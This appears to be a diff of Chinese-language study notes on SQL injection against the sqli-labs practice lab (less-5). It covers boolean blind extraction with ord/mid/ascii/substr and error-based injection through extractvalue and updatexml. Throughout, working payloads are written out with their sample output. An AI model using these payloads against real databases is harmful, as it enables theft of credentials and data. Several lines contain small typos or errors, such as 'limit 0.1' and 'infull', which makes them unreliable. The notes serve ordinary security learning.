@@ -54,7 +54,7 @@ SQL注入类型：数字和字符型 表中存在id字段的才可以使用，�
  1'and length(select password from users limit 0,1)>3--+
  九.判断第一条数据的字段内容
  1'ascii(substr(select password from users limit 0,1))>97--+
- %3e=大于
+ %3e=大于 0x20=t
  正则注入
  ord()函数返回第一个字符的ascii值如ord(mid(database(),1,1))>114意义第一位的ascii值是否大于114
  less-5
@@ -64,5 +64,22 @@ SQL注入类型：数字和字符型 表中存在id字段的才可以使用，�
  4.利用ascii和substr获取数据库表的第一位 1'and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit0,1),1,1))=101--+
  5.利用regexp获取表中的列1'and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp'^us[a-z]'limit 0,1)--+
  6.选择users表中的列名是否有us** 1'and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp'^username' limit 0.1)--+
- 
- 
+ 7.利用ord()和mid()函数获取users表的内容,获取username表的第一行第一个字符：1'and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68--+
+ 7.ord()将第一个字符转换为ascii码
+ if(expr1,2,3),ifnull(expr1,expr2)如果不是空返回expr1,否则返回expr2如infull(null,'aa')返回aa
+ cast(expression as data_type)将expression转换为data_type类 data_type常为char
+ ord()
+ 报错注入
+ 为什么报错注入？
+ 在实际场景中如果没有一个合适的数据返回点，而是仅仅带入sql数据库查询，就需要报错注入 select*from users where id='id'limit0,1 正常进行绕过，但是less5没有数据回显，断定为报错注入
+ 1.extractvalue
+ and extractvalue(null,concat(0x7e,(sql_inject),0x7e))
+ 可以理解为，让后台xml故意报错，0x7e=~,利用这种方式，对后台进行一个排序，指定第一个参数为Null,让它故意报错，将第二个参数带入数据库执行，最后报错显示执行的结果 
+ 1'and extractvalue(null,concat(0x7e,(select database()),0x7e))--+ 返回： XPATH syntax error: '~security~
+ 进一步获取表名列名，数据
+ union select，在报错注入情况下，我们只能去使用select而非union select,他们的语句执行有什么区别？
+ 获取表名：union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema='security'
+ select table_name from information_schema.tables where table_schema='security' 返回 Subquery returns more than 1 row 处理使用limit:数据库中的排序 limit 0,1表格中数据第一项后面爆破数据
+ 2.updatexml
+ and 1=(updatexml(1,concat(0x7e,(sql_inject)),1))
+这个函数用来更新xml数据的，但是我们非法传参，使它故意报错，执行我们的sql语句，0x7e是~用来区分数据
